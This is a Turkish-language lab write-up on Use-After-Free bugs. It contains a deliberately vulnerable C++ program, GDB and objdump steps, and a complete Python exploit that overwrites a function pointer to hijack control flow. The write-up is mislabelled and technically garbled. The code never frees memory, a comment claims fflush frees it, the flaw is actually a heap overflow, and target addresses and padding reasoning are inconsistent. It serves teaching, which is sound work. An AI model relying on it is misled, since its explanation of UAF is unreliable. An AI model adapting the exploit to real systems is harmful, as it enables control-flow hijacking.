# CyberLabs: Use-After-Free (UAF) Zafiyeti Laboratuvarı

**Modül Kodu:** CL-MEM-002

**Seviye:** Orta / İleri

**Konu:** Bellek Bozulması Zafiyetleri (Memory Corruption)

## Laboratuvarın Amacı

Bu laboratuvar, CyberLabs eğitim platformu için hazırlanmış olup, sık karşılaşılan bellek bozulması zafiyetlerinden biri olan **Use-After-Free (UAF)** konusunu ele almaktadır. Katılımcıların bu laboratuvar sonunda aşağıdaki yetkinlikleri kazanması hedeflenmektedir:

  - UAF zafiyetinin temel nedenlerini ve yaşam döngüsünü anlamak.
  - Bir işaretçi (pointer) serbest bırakıldıktan sonra belleğe nasıl erişildiğini pratik olarak gözlemlemek.
  - `g++` ve `objdump` gibi araçlarla temel statik analiz ve derleme süreçlerini uygulamak.
  - Kontrol edilen bir laboratuvar ortamında, programın kontrol akışını değiştirmeye yönelik temel bir exploit (sömürü kodu) geliştirmek.

## Senaryo
Laboratuvar senaryosu, iki ana bileşenden oluşmaktadır:

1.  `zafiyetli_sunucu.cpp`: İçerisinde kasıtlı olarak bir UAF zafiyeti barındıran, C++ ile yazılmış hedef uygulama.
2.  `exploit.py`: Zafiyetli uygulamadaki açığı tetikleyerek programın akışını değiştiren ve önceden belirlenmiş bir fonksiyonu çağıran Python sömürü kodu.

## Disclaimer / Yasal Uyarı

The information provided in this blog post is intended for educational and informational purposes only. It is not intended to encourage or promote any illegal or unethical activities, including hacking, cyberattacks, or any form of unauthorized access to computer systems, networks, or data.

Bu blog yazısında sağlanan bilgiler yalnızca eğitim ve bilgilendirme amaçlıdır. Bilgisayar korsanlığı, siber saldırılar veya bilgisayar sistemlerine, ağlara veya verilere herhangi bir şekilde yetkisiz erişim de dahil olmak üzere herhangi bir yasa dışı veya etik olmayan faaliyeti teşvik etme veya reklamlama amacı taşımaz.

Bu laboratuvar içeriği, tamamen **CyberLabs eğitim ortamı** için tasarlanmıştır. Buradaki bilgi ve kodların amacı, siber güvenlik uzmanlarının savunma mekanizmalarını daha iyi anlamalarına ve zafiyet analizi yeteneklerini geliştirmelerine yardımcı olmaktır. Bu materyallerin CyberLabs ortamı dışında veya yasa dışı amaçlarla kullanılması kesinlikle yasaktır ve tüm sorumluluk kullanıcıya aittir.

## Use-After-Free Zafiyeti Nedir ?
<img width="720" height="374" alt="resim" src="https://github.com/user-attachments/assets/21456c7c-5d91-4b9b-9086-cba398fea2c2" />

Use-After-Free (UAF), Türkçesiyle **"Serbest Bırakıldıktan Sonra Kullanım"**, bir programın dinamik olarak ayırdığı bir bellek bölgesini sisteme iade ettikten (serbest bıraktıktan) sonra, artık geçersiz olan bu bellek adresine tekrar erişmeye veya kullanmaya çalışmasıyla ortaya çıkan kritik bir bellek yönetimi güvenlik açığıdır.

Bu erişim, genellikle artık o adresi işaret etmemesi gereken **"sarkan bir işaretçi"** (dangling pointer) üzerinden yapılır. Saldırganlar bu durumu, serbest bırakılan bellek alanına kendi kötü amaçlı kodlarının adresini yazarak ve programın daha sonra bu geçersiz işaretçiyi takip edip o adresi çalıştırmasını sağlayarak istismar edebilirler.

Başarılı bir istismar, programın çökmesine, hassas verilerin sızdırılmasına veya sistemin kontrolünün tamamen ele geçirilmesine yol açabilir.

## Kurulum ve Çalıştırma Adımları

<img width="556" height="313" alt="resim" src="https://github.com/user-attachments/assets/7f2e107a-b191-4cbe-9009-5fdca927fdf9" />

**Örnek Kod İncelemesi**

Şimdi adım adım örnek bir kod yazalım ve zafiyeti istismar edelim. Öncelikle zafiyetli programımızı yazalım:

```cpp
#include <cstdio>
#include <cstdlib>

// Exploit için enjekte edilecek fonksiyon
void basariMesaji() {
    printf(">>> KONTROL ELE GECIRILDI! Zafiyet basariyla istismar edildi.\n");
}

// Zafiyeti barındıran veri yapısı (struct).
typedef struct {
    char kullaniciVerisi[100]; // Dışarıdan veri almak için kullanılacak 100 byte'lık bir buffer alanı.
    void (*islemYapPtr)(); // Programın akışını değiştirmek için üzerine yazılacak olan fonksiyon işaretçisi.
} Session;

// Programın başlangıç noktası.
int main() {
    // Ekrana (standart hata akışına) programın başladığını belirten bir mesaj yazdırır.
    fprintf(stderr, "[KURBAN] Program baslatildi.\n");
    Session* ses = (Session*)malloc(sizeof(Session)); // 'Session' yapısı için heap alanında yer ayırır.
    fflush(stdout);  // Alanı serbest bırakır
    fread(ses->kullaniciVerisi, 1, 108, stdin); // kullaniciVerisi değerini islemYapPtr üzerine yazar
    if (ses && ses->islemYapPtr) {
        // Exploit başarılıysa, bu komut 'basariMesaji' fonksiyonunu çalıştırır.
        ses->islemYapPtr();
    }
    return 0;
}
```

Burada **"islemYapPtr"** değeri oluşturduktan sonra ilgili değerin üzerine **"kullaniciVerisi"** değeri yazılır. Aslında zafiyetin temel mantığı da burada anlaşılabilir. Amaç, bellekten silinen kodun yerine yeni bir değerin yazılmasıyla farklı bir fonksiyonun çağırılmasıdır.

Halen anlamadıysanız daha basit bir koda da bakabilirsiniz. Ayrıca bu kodla diğer kod için **PADDING\_SIZE'da** hesaplayabilirsiniz. **Bu kodu derlemek için "-no-pie" tag'i kullanmanıza gerek yoktur.**

```cpp
#include <cstdio>
#include <cstddef>

typedef struct {
    char kullaniciVerisi[100];
    void (*islemYapPtr)();
} Session;

int main() {
    printf("Boyut (sizeof(Session)): %zu byte\n", sizeof(Session));
    printf("islemYapPtr'nin baslangic konumu (offsetof): %zu byte\n", offsetof(Session, islemYapPtr));
    return 0;
}
```
<img width="460" height="81" alt="resim" src="https://github.com/user-attachments/assets/3ab51c26-50c9-4ca6-b0ae-d74ebb9b5ee1"/>

*PADDING SIZE hesaplama (104 bayt)*

Artık kodu derleyebiliriz. Kodu derlemek için **"-no-pie"** kullanmalıyız. Bu tag'i kullanma nedenimiz **"Position-Independent Executable"** özelliğini kapatmamız gerekiyor. Böylece ASLR özelliğini devre dışı bırakarak tahmin edilebilir alanlara değerin yazılmasını sağlıyoruz.

**"-g"** kullanma sebebimiz ise ilerleyen aşamalarda zafiyeti incelemek için GDB adlı program ile debugging yapacağımız için debug sırasında değişkenlerin görünmesidir.

```bash
g++ -o zafiyetli_sunucu zafiyetli_sunucu.cpp -no-pie -g
```
<img width="601" height="273" alt="resim" src="https://github.com/user-attachments/assets/22031d56-4296-4d8e-9976-3625c2978a19" />

*no-pie Kullanılmazsa*

<img width="577" height="358" alt="resim" src="https://github.com/user-attachments/assets/fa1b31b4-c6d1-4e2a-afdc-3b6b4b1f5ddb" />

*no-pie Kullanılırsa*

**Dostlar buraya kadar anlaşılması çok önemlidir. Anlamadıysanız yeniden kodları okuyun. Bu kodu anlamadan devamını anlayamazsınız. Bu noktadan sonra artık zafiyetin sömürülme aşamasına başlıyoruz.**

### Exploit Geliştirme Aşaması

Öncelikle **"basariMesaji"** fonksiyonunun bellek konumunu statik olarak bulmamız gerekiyor. Bunun için aşağıdaki komutu kullanacağız:

```bash
objdump -t ./zafiyetli_sunucu | grep basariMesaji
```
Aşağıdaki komutu çalıştırdıktan sonra gelen çıktıyı beraber inceleyelim:

<img width="626" height="137" alt="resim" src="https://github.com/user-attachments/assets/a634089a-52d1-4013-bd4d-dfb8f0ab05ca" />

*Bellek Adresi Tespiti*

Çıktıya baktığımızda ilgili değişkenin **".text"** alanında **"0x401166"** bellek adresinde depolandığını statik olarak tespit ediyoruz. Yani bu değer bir noktada boş oluyor ve boş olduğu halde yeniden kontrol ediliyor.

Şimdi ilgili zafiyetli değişkenin padding size'ını tespit etmeliyiz ki o kadar uzunlukta bir veriyle dolduralım. Bunun için sizler kolay yoldan bu kodla çözebilirsiniz. **"offsetof"** değerini esas alabilirsiniz. Ben uzun ve teknik yolunu anlatacağım.

```cpp
#include <cstdio>
#include <cstddef>

typedef struct {
    char kullaniciVerisi[100];
    void (*islemYapPtr)();
} Session;

int main() {
    printf("Boyut (sizeof(Session)): %zu byte\n", sizeof(Session));
    printf("islemYapPtr'nin baslangic konumu (offsetof): %zu byte\n", offsetof(Session, islemYapPtr));
    return 0;
}
```

Şimdi GDB ile incelemeye başlıyoruz. Bunun için **"gdb zafiyetli\_sunucu"** komutunu kullanıyorum.

<img width="630" height="326" alt="resim" src="https://github.com/user-attachments/assets/bb704001-722f-4fb3-9d4f-b5efb3949c0c" />

Ardından **"list main"** komutuyla kodlarımızı görüntülüyoruz:

<img width="933" height="533" alt="resim" src="https://github.com/user-attachments/assets/d15363fc-55c5-4b91-a39a-3c2daee2c253" />

*GDB ile Kodların Görüntülenmesi*

Kodları görüntüledikten sonra daha önce hesapladığımız heap alanı için bir payload oluşturmamız gerekiyor. Bu aşamada şöyle bir Python scripti ile değeri oluşturabiliriz.

```python
import struct
PADDING_SIZE = 100 # Geçici değer
TARGET_ADDRESS = 0x401176 # Hesaplanan Heap Değeri
payload = b'A' * PADDING_SIZE + struct.pack("<Q", TARGET_ADDRESS)
with open("payload.bin", "wb") as f: f.write(payload)
print("'payload.bin' oluşturuldu.")
```

Ardından GDB'ye geri dönüyoruz ve "break 22" yazıyoruz. Böylece 22'nci satırda kod duracaktır.

<img width="934" height="528" alt="resim" src="https://github.com/user-attachments/assets/f28e02ed-6dbe-405a-a6de-c0d1ecaf9c1c" />

*Breakpoint Ataması*

PADDING\_SIZE değerini yavaş yavaş arttırıyoruz ve GDB üzerinden **"run \< payload.bin"** komutuyla denemeye başlıyoruz.

<img width="687" height="553" alt="resim" src="https://github.com/user-attachments/assets/3d2a5fe4-c140-4356-9200-fae3af29566a" />

*Enjeksiyon Denemesi - 1*

Bu aşamada if döngüsünü geçmek üzere olduğumuzu görüyoruz. Şimdi değerlerimiz oluşmuş mu diye bakmak için öncelikle değerin yerini bulmak için **"print ses"** komutunu çalıştırıyoruz. Burada çıkan değeri bir yere not alıyoruz.

<img width="908" height="553" alt="resim" src="https://github.com/user-attachments/assets/9a3654f5-1ac1-4bef-9712-9430a78b38d6" />

*Değişken Yerini Bulma*

Şimdi en önemli aşamadayız "x/16gx DEGER" şeklinde komutu çalıştırıyoruz. Bu komutun manası ise **"belleği incele (x), 16 birimlik değer göster (/16), giant word formatında göster (her biri 8 bit, g) ve hex olarak göster (x)"** diyoruz.

<img width="924" height="557" alt="resim" src="https://github.com/user-attachments/assets/097acd1b-ce99-4c34-87f4-d42e7b5447e7" />

*Zafiyetin Tespiti*

**BINGO\!** Zafiyeti başarıyla tespit etmiş bulunuyoruz. Artık hesaplamaya geçiyoruz. Bu değerlere göre başlangıç değişkenimiz **0x4052a0** oluyor. **0x405300 satırına dikkatli bakarsanız 0x00401176 değerini görebilirsiniz.** Bu değeri incelediğimizde,

  - 0x405300 -\> 41
  - 0x405301 -\> 41
  - 0x405302 -\> 41
  - 0x405303 -\> 41
  - 0x405304 -\> 76
  - 0x405305 -\> 11
  - 0x405306 -\> 40
  - 0x405307 -\> 00

Yani aslında **0x405304 (büyük değer)** değeri **0x4052a0** değerlerini birbirinden çıkarttığımızda ise **0x000064** hex değerini elde ediyoruz. Hesapladığımızda, **6*16+4*1=100** olmaktadır yani **islemYapPtr fonksiyon işaretçisinin, kullaniciVerisi buffer alanının başlangıcından tam 100 byte sonra başladığını kanıtlar. Ancak 100, 8'i tam bölmediği için bir sonraki en yakın değer olan 104 bizim PADDING\_SIZE değerimiz olmalıdır.**

Şimdi tüm bu bilgilerle sömürü kodumuzu yazmaya başlıyoruz. Ben sömürü kodu için Python dilini kullanıyorum. Sizler farklı dillerde yazabilirsiniz.

Statik değişkenlerimizi belirleyelim:

```python
# Zafiyetli programın adı
VICTIM_PROGRAM = "./zafiyetli_sunucu"

# objdump ile bulduğumuz statik adres.
HARDCODED_ADDRESS = 0x401166
# Padding boyutumuz
PADDING_SIZE = 104
```

Ardından programı başlatan kodu yazıyoruz:

```python
 try:
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] HATA: '{VICTIM_PROGRAM}' bulunamadi. C++ kodunu -no-pie ile derlediniz mi?")
        sys.exit(1)
```

Şimdi payloadlarımızı hazırlayan aşamayı yazıyoruz:

```python
padding = b'A' * PADDING_SIZE
overwrite_address = struct.pack("<Q", HARDCODED_ADDRESS)
payload = padding + overwrite_address
print(f"[*] Payload {len(payload)} byte olarak olusturuldu.")
print("[*] Payload kurban programa gonderiliyor...")
```

Ardından enjekte ettiğimiz fonksiyonun çıktılarını kontrol ettiğimiz aşamayı yazıyoruz:

```python
 stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')

    print("\n--- Kurban Programdan Gelen Cikti ---")
    print(stdout_output)
    print("--- Kurbandan Gelen Hata Ciktisi (varsa) ---")
    print(stderr_output)
    print("--- Exploit Tamamlandi ---")
    
    if "KONTROL ELE GECIRILDI" in stdout_output:
        print("\n[+] Zafiyet basariyla istismar edildi!")
    else:
        print("\n[-] Istismar basarisiz oldu.")
```

Ve sömürü kodumuzu çalıştırdığımızda başarıyla fonksiyonu enjekte ettiğimizi görüyoruz.

*Sömürünün Başarılı Olması*

### Sömürü Kodunun Tam Hali

```python
import struct
import subprocess
import sys

# Zafiyetli programın adı
VICTIM_PROGRAM = "./zafiyetli_sunucu"

# 1. Adım'da objdump ile bulduğumuz ve HİÇ DEĞİŞMEYECEK olan statik adres.
# Siz de kendi sisteminizde bulduğunuz adresi buraya yazmalısınız!
HARDCODED_ADDRESS = 0x401166

PADDING_SIZE = 104

def main():
    print("--- [SALDIRGAN] Python Exploit (Statik Adres ile) Baslatildi ---")
    
    try:
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] HATA: '{VICTIM_PROGRAM}' bulunamadi. C++ kodunu -no-pie ile derlediniz mi?")
        sys.exit(1)
        
    print(f"[*] Hedef adres statik olarak biliniyor: {hex(HARDCODED_ADDRESS)}")
    
    # Payload'ı SABİT adres ile oluştur
    padding = b'A' * PADDING_SIZE
    overwrite_address = struct.pack("<Q", HARDCODED_ADDRESS)
    payload = padding + overwrite_address
    
    print(f"[*] Payload {len(payload)} byte olarak olusturuldu.")
    print("[*] Payload kurban programa gonderiliyor...")
    
    stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')

    print("\n--- Kurban Programdan Gelen Cikti ---")
    print(stdout_output)
    print("--- Kurbandan Gelen Hata Ciktisi (varsa) ---")
    print(stderr_output)
    print("--- Exploit Tamamlandi ---")
    
    if "KONTROL ELE GECIRILDI" in stdout_output:
        print("\n[+] Zafiyet basariyla istismar edildi!")
    else:
        print("\n[-] Istismar basarisiz oldu.")

if __name__ == "__main__":
    main()
```

Okuduğunuz için teşekkür ederim\!



